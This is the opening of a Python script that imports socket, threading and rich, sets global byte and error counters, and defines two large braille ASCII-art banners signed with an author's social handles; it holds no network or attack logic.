import socket
import threading
import time
import os
import sys
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.text import Text

console = Console()

total_bytes_sent = 0
total_bytes_received = 0
error_count = 0
lock = threading.Lock()

# ASCII ART 1 (Tampilan Menu Input)
ASCII_MENU = """[magenta]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠷⣄⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⡞⣠⡌⢦⣠⣾⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣦⡀⠀⠀⠀⠀⣀⡠⢴⣒⣯⣭⣥⣤⣤⣴⣤⣤⣭⣍⣛⡒⠦⢄⡀⠀⢰⡵⣁⣼⣦⢻⠟⠻⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣄⠀⠀⠀⢿⡟⢿⣦⣠⠔⣋⣥⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⡓⢿⣛⣯⣿⣾⣷⣧⣀⠘⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣷⣄⠀⢼⢁⡤⣋⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣽⣿⣿⣿⣿⣿⣇⡉⠚⠧⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡟⠉⠻⣷⣼⢋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣌⡓⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣶⣶⣿⢳⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠚⠷⠦⣄⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⢿⣿⣾⣿⠧⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⡜⠁⣼⣿⣿⡟⢀⣠⣴⣾⣿⣿⣿⣿⠀⢹⣿⣿⣿⣿⣿⣿⡆⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣾⠀⣼⣿⣿⣿⣳⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⢿⣿⣿⣿⣿⣏⢿⠀⢀⣙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣿⠃⣸⣿⣿⣿⡟⣿⣿⣿⣿⣿⣿⣿⡿⡗⠂⠀⠈⢿⢿⣿⣿⣿⠈⠃⠀⣡⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⡄⠀⠀⠀⠀
⠀⢀⣠⠞⠋⡎⢠⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⠇⡇⢠⡄⠀⠈⢯⠻⣿⣿⡄⠀⠀⠈⠉⣹⣿⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠙⠿⣷⣄⠀⠀⠀
⠐⠋⠁⠀⢸⠁⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢀⣿⣶⣶⠄⠀⠀⠀⠙⢿⣇⠀⠀⠀⠀⣿⣿⣿⣿⣿⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠈⠙⠦⠄⠀
⠀⠀⠀⠀⣇⣆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣿⣿⣦⠀⠀⠀⠀⠈⠻⠀⠀⠀⠀⠿⠟⣿⣿⣿⡇⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⢸⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣇⠉⠉⣿⠇⢸⣿⣿⣿⣿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⢘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠈⣻⡿⣿⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠘⠉⠀⢸⣿⣿⣿⣧⢯⣿⣿⣿⣿⣿⣿⣯⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⢸⢸⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣷⠀⠘⢇⡀⣼⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⣶⣴⡶⢸⣿⣟⣿⣧⡾⢻⣿⣿⣿⣿⡿⠹⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⡼⠘⣿⣿⣿⣿⣿⡟⠘⣿⣟⣿⣿⣿⣿⣧⢀⣀⣀⠀⠀⠀⠀⠀⢀⣠⠤⠴⠒⠲⣄⠀⠉⠁⠀⣸⠏⣿⣿⡿⠁⠘⣿⢿⣿⣿⡇⠀⢸⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣗⠀⢻⡷⣾⡏⣿⡇⠀⣿⣿⠗⢻⣿⢿⡿⣿⡛⠉⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⣟⣼⣿⡏⠀⠀⠀⢿⠈⡿⡟⠀⠀⣿⣿⣷⡹⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠉⠀⠈⠻⡜⡏⠸⡁⠀⣳⡇⢧⡘⣿⡸⣿⡈⠓⠄⠀⠀⠀⠀⠀⠳⡄⠀⠀⠀⣠⠞⠀⠀⢀⣴⣿⡟⠸⠁⠀⠀⠀⠀⠀⡟⣀⣠⣤⣿⠿⠇⠁⠘⠦⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠁⠀⢸⠁⠈⢿⣽⣇⢿⡹⢤⣀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣶⣶⣤⣀⣴⣾⣿⢟⡟⠁⣀⡀⠀⠀⠀⠈⢳⡤⣤⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠈⢿⣯⢮⢷⡀⠀⠉⠑⠒⠒⠠⠤⣤⣄⣠⣤⣶⠿⢿⣛⣻⠯⠭⠭⢽⣿⠛⠿⢿⣾⣿⣿⠋⢸⠀⠀⠛⠃⠀⠀⠀⠀⠀⠀⠀⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠆⠙⠻⠦⠀⠀⠀⠀⢠⠴⣚⣩⡉⣧⢰⠋⠉⠀⠀⠀⠀⠀⢸⣿⣷⣤⠤⠶⢭⠙⢷⠾⡄⠀⠰⢤⡀⠀⢠⣤⠀⠀⢀⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣏⠉⠀⡇⣹⢸⠀⠀⠀⣀⣀⠀⣠⣼⣿⠋⠁⠀⠀⠘⠿⠿⣄⠉⣦⡀⠀⠉⠀⠈⠉⢀⡿⡏⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡖⠤⣤⣠⠴⠿⠿⢿⣿⣷⣿⣾⣾⣛⣉⣉⣉⡉⠉⠛⢫⡄⢠⠇⠀⠀⠀⠀⠹⡄⠈⡿⠲⠤⠤⠤⠴⠚⡇⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⢰⣫⣵⣶⣿⣿⣿⣿⣮⣹⣶⣶⣿⣿⣿⣿⣿⣷⣤⡀⡼⠀⣸⠀⠀⠀⠀⠀⠀⢹⡾⠁⠀⠀⠀⠀⠀⠀⡇⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⢣⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢯⠇⠀⡇⠀⠀⠀⠀⠀⠀⠀⡿⠢⣄⠀⢀⡀⠀⢰⣿⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⠇⠀⠀⢠⡏⣻⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣾⠀⠀⡇⠀⠀⠀⠀⠀⠀⠈⠀⢀⣜⡆⠘⢿⣿⣏⣿⣀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⡞⠀⠀⠀⣾⢻⢿⣿⣿⣿⣿⣿⡟⢸⢸⣿⣿⣿⣿⣿⣿⣽⡟⠀⠀⡇⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⡇⠀⠀⢸⠛⢿⢿⡗
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⠰⡃⠀⠀⢰⠇⢸⣯⣿⣿⣿⣿⣏⣇⣿⣸⣼⣿⣿⠿⣿⠟⠋⠀⠀⠀⡇⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⡇⠀⠀⢸⡆⠸⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣀⡸⡄⠀⡟⠀⠈⠛⠻⠿⣿⣿⠿⠿⠛⠛⠹⣿⣿⡀⠀⠀⠀⠀⠀⢠⡷⠀⠀⠀⣼⣿⣿⣿⣿⠿⣿⣧⠀⠀⢸⣧⠀⢳⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⢠⠄⠀⠀⠀⣿⠟⠀⠀⠀⠀⠀⠀⠈⢷⡀⠀⣼⣿⡿⠋⠁⠀⠀⠀⢯⠀⠀⠀⠘⣆⣯⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠈⠉⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣦⣿⠟⠁⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠘⠃⠃
⠀⠀⠀⠀:3⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡿⠈⢧⠀⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠸⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⠇⠀⠈⢣⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⡇⣀⣀⣠⡤⠴⢒⢦⡹⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢧⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⡿⣿⣿⣿⡿⠋⠁⢠⡀⠘⢦⡙⢾⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠱⡄⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⣿⡟⠛⠉⢸⣿⠟⠁⠀⠐⢦⡀⠙⣄⠀⢱⣴⠋⢷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⠀⠘⢆⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⢿⣿⡟⠀⠀⠀⢸⣿⡀⢠⣶⣦⠀⢹⣄⣼⣵⣿⡇⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⠈⢧⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠁⣿⣿⠀⠀⠀⣀⠙⢿⣿⣾⣿⣿⣷⣿⣿⠟⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⣆⠀⠀⠀⠀⠀⠀⠀⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⡽⣿⣶⣾⡿⠃⠀⠀⢠⣿⣿⣿⣨⠞⠁⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡃⠀⠀⠈⣽⣿⣿⡀⠀⠀⠀⣾⣿⣿⣿⠃⠀⠀⢸⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⡄⠀⠀⠀⠀⠀⠂
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⠤⠤⠬⠽⠿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠇⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⡇⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡄⠀⠀⠀⠀
ig :@renxtech git: renXTech-sys gmail: renxtech@gmail.com
[/magenta]"""

# ASCII ART 2 (Tampilan Eksekusi Live)
ASCII_EXECUTE = """[magenta]⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀               ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣦⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⢀⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡿⢴⠟⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⣀⡀⠤⣀⣸⣝⡶⠁⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣦⣯⢃⣮⣤⡤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠦⢄⣼⠻⣤⠖⠉⠁⠀⠀⠀⠀⢠⣈⠙⠳⣶⣅⣷⣤⣤⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⡿⠟⠛⠉⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣈⢀⣀⣹⠎⠀⠀⠆⢸⡀⢰⠐⡄⠀⠉⢿⠠⢜⣽⣿⢈⣑⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣿⢻⣧⣙⣿⠀⢰⠸⠀⣼⣇⠘⣷⡈⣶⣄⣄⢣⢆⠙⣿⣏⣼⣿⣝⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡿⠆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡇⢸⣯⣿⢏⠀⢸⣴⣠⣿⣿⡆⣿⣿⣾⣿⣿⣦⡏⢷⡜⣽⡎⢿⡛⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡾⠁⡇⢸⣿⡿⡾⢠⢸⣿⣾⣥⡝⢿⣇⠻⢺⣿⡿⣿⣿⡜⣿⣿⣷⡈⢃⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢡⣿⣿⣄⣷⣧⢧⢏⡿⡿⣧⠈⠀⠀⠘⢿⠇⢹⣿⣧⡿⣿⡟⣿⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠠⣀⠀⠀⠀⠈⢿⡿⣿⣿⣿⣯⣻⣆⠉⠁⢀⣀⣂⣄⠀⢀⡰⣿⢻⡇⠙⡇⠀⠙⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣴⣪⣲⡷⡄⠀⠀⠈⠧⠈⠻⢿⡿⣿⣿⣦⣤⣌⣓⣒⣩⣶⣽⡀⠈⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣏⢿⣿⡟⣼⠂⠀⠀⠀⠀⠀⢀⡴⠋⠉⠉⠙⣿⠿⣿⣿⣿⡿⣿⣇⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣟⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡜⣯⠀⡎⠀⠀⠀⠀⢠⡖⠁⢀⠀⠀⠀⢰⢻⠀⠀⠈⣿⡇⠈⡞⡄⠀⠳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠣⣡⣤⣇⠀⠀⠀⠀⠘⢷⣍⡟⠀⠄⢤⣻⣗⣢⣤⣠⣜⣃⡠⣼⣧⠐⡇⠱⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⠋⡈⠓⢄⠀⢸⣿⣯⣟⣻⣿⣞⣓⣿⠀⣿⡀⠉⠛⣿⠋⠉⡿⣤⡇⡠⡺⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣯⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⣤⣕⡸⠉⠳⢤⠋⠻⣻⣧⣿⠀⢸⣿⠀⣿⡇⠀⣀⣿⠀⣀⣿⣏⣤⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠛⠈⠫⡣⣀⠀⣣⡪⠋⠀⠁⠀⠀⣿⠀⣾⡇⠍⢑⣿⠚⢡⣿⢿⡟⣳⡆⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⢿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠺⠯⠞⠁⠀⠀⠀⠀⠀⣿⢀⣿⠁⠀⢸⡎⠀⣸⣿⠷⡶⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣯⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡿⡼⣿⠀⠀⣧⠃⠀⣿⡿⠠⠧⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣄⡖⠒⣖⠟⣽⣣⢞⢄⣿⡇⠀⢠⠻⠀⢀⣿⡔⢤⡀⢈⢑⣄⡦⡀⠀⠀⠀⢀⣾⡝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡠⢤⡚⠛⣿⣿⣶⠿⣿⡏⢉⣿⣿⡿⠀⠄⣸⡇⠀⢸⣽⣨⣵⠪⢕⣳⢄⠁⡙⣦⡠⠔⣞⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⣾⣿⠏⠀⠀⢻⣶⢿⣁⣀⠬⠴⣯⣿⣿⡁⠓⠂⣿⠁⠀⢸⣳⣿⡋⣇⠘⠓⠊⠷⣿⣞⣱⡞⢗⠣⡵⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣴⣶⢞⡝⠈⠉⠛⠷⠶⢾⣶⣶⣶⣇⠤⠒⠊⠻⢶⡬⣀⣀⣿⣀⡀⡥⠋⠻⣾⣽⣤⣀⠀⠀⠀⣹⣷⣜⡦⠏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣷⣽⣿⣎⠄⠀⣠⠖⠉⣡⣴⠔⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⡒⠐⠊⠀⠀⠀⠀⠙⣿⣷⣦⡀⣰⡻⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠹⣿⣼⣟⠀⠸⡁⠀⡔⣷⠁⠀⢸⡏⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣦⡀⠀⠀⠀⠀⠀⠸⣷⠙⢿⣟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⠻⣿⡎⣳⣇⠈⠃⣿⠃⠀⠀⢸⣣⠾⣧⣀⡤⣶⣿⠿⠛⠉⠈⠛⣿⣶⣄⡀⠀⠀⣀⣿⢀⡎⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⢿⣼⣟⣗⠢⣇⢢⢄⠀⠎⠯⠽⠛⢺⠋⠉⠁⠀⠀⠀⠀⠀⡇⡎⠛⠿⣷⣮⣞⣿⢀⢸⢸⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠉⠻⣿⣄⣹⣳⡒⠷⣌⣂⡀⠸⣸⠀⣇⢣⢀⡠⢄⠀⣰⢧⠃⠀⠀⠀⢉⢽⡟⢀⣾⡾⠛⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⠿⣎⡀⣴⣏⣉⢈⠖⡪⠕⡧⣤⣀⣼⣽⣎⣐⣈⣉⣰⣻⣿⢔⣻⣷⣴⠷⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⡻⠭⢼⣴⣶⣦⣼⣫⢡⣤⣥⣽⣕⣰⣿⣿⡽⠟⠉⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢇⠀⠀⡀⠀⠀⡏⠉⠉⢏⠉⠉⠁⠈⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡦⠜⠒⠀⠒⡇⠀⠀⠸⡠⠤⠤⠤⠲⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⠀⠀⠀⠀⡇⠀⢀⣾⣇⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
